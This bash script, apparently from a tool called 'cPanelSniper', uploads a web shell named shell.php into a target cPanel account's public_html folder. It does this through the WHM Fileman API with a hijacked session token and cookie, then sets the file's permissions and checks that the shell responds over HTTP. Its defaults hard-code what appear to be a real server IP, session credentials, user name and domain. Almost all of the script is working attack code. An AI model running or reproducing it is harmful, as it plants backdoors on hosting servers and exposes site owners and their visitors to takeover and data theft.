#!/bin/bash
# Upload shell to single account (for testing)
# Usage: ./upload_single.sh <WHM_HOST> <SESSION_TOKEN> <COOKIE> <TARGET_USER> <TARGET_DOMAIN>

WHM_HOST="${1:-5.9.241.37}"
SESSION_TOKEN="${2:-/cpsess2231081202}"
COOKIE="${3:-%3ARpRCEB84DQNWOqju}"
TARGET_USER="${4:-kousoul}"
TARGET_DOMAIN="${5:-kousoul.com}"

echo "========================================"
echo "  Upload shell to Single Account"
echo "========================================"
echo ""
echo "Target: $TARGET_DOMAIN ($TARGET_USER)"
echo ""

# Check shell file
SHELL_FILE="/root/cPanelSniper/shell.php"
if [ ! -f "$SHELL_FILE" ]; then
    echo "❌ Shell file not found: $SHELL_FILE"
    exit 1
fi

# Convert to base64
SHELL_B64=$(base64 -w 0 "$SHELL_FILE")
echo "✓ Shell loaded: $(echo "$SHELL_B64" | wc -c) bytes (base64)"
echo ""

echo "[1/3] Uploading shell via Fileman API..."

# Try Fileman savefilecontent with base64 encoding
RESULT=$(curl -sk "https://${WHM_HOST}:2087${SESSION_TOKEN}/json-api/cpanel" \
  -H "Cookie: whostmgrsession=${COOKIE}" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "cpanel_jsonapi_user=${TARGET_USER}" \
  -d "cpanel_jsonapi_module=Fileman" \
  -d "cpanel_jsonapi_func=savefilecontent" \
  -d "cpanel_jsonapi_apiversion=3" \
  -d "dir=%2Fpublic_html" \
  -d "file=shell.php" \
  -d "content=${SHELL_B64}" \
  -d "encoding=base64" 2>/dev/null)

echo "$RESULT" | python3 -m json.tool 2>/dev/null || echo "$RESULT"

echo ""
echo "[2/3] Checking if file was created..."

# Check file exists
CHECK_RESULT=$(curl -sk "https://${WHM_HOST}:2087${SESSION_TOKEN}/json-api/cpanel" \
  -H "Cookie: whostmgrsession=${COOKIE}" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "cpanel_jsonapi_user=${TARGET_USER}" \
  -d "cpanel_jsonapi_module=Fileman" \
  -d "cpanel_jsonapi_func=listfiles" \
  -d "cpanel_jsonapi_apiversion=3" \
  -d "dir=%2Fpublic_html" \
  -d "showhidden=1" 2>/dev/null)

if echo "$CHECK_RESULT" | grep -q "shell.php"; then
    echo "✅ shell.php found in public_html"
else
    echo "❌ shell.php NOT found in public_html"
    echo ""
    echo "Files in public_html:"
    echo "$CHECK_RESULT" | jq -r '.data.files[].name' 2>/dev/null || echo "$CHECK_RESULT"
fi

echo ""
echo "[3/3] Setting permissions..."

# Set permissions and ownership
curl -sk "https://${WHM_HOST}:2087${SESSION_TOKEN}/json-api/cpanel" \
  -H "Cookie: whostmgrsession=${COOKIE}" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "cpanel_jsonapi_user=${TARGET_USER}" \
  -d "cpanel_jsonapi_module=Fileman" \
  -d "cpanel_jsonapi_func=fileop" \
  -d "cpanel_jsonapi_apiversion=3" \
  -d "op=chmod" \
  -d "sourcefiles=%2Fpublic_html%2Fshell.php" \
  -d "mode=0644" >/dev/null 2>&1

echo "✅ Permissions set to 644"

echo ""
echo "========================================"
echo "  Result"
echo "========================================"
echo ""
echo "Shell URL: https://${TARGET_DOMAIN}/shell.php"
echo ""
echo "Test access:"
echo "  curl -sk https://${TARGET_DOMAIN}/shell.php | head -20"
echo ""

# Test actual web access
echo "[Testing Web Access]..."
HTTP_CODE=$(curl -sk -o /dev/null -w "%{http_code}" "https://${TARGET_DOMAIN}/shell.php")
if [ "$HTTP_CODE" = "200" ]; then
    echo "✅ Shell accessible via HTTP (200 OK)"
    echo "   → https://${TARGET_DOMAIN}/shell.php"
elif [ "$HTTP_CODE" = "403" ]; then
    echo "⚠️ Shell accessible but returns 403 (may be protected)"
elif [ "$HTTP_CODE" = "404" ]; then
    echo "❌ Shell NOT accessible via HTTP (404)"
else
    echo "⚠️ Shell returned HTTP $HTTP_CODE"
fi

echo ""
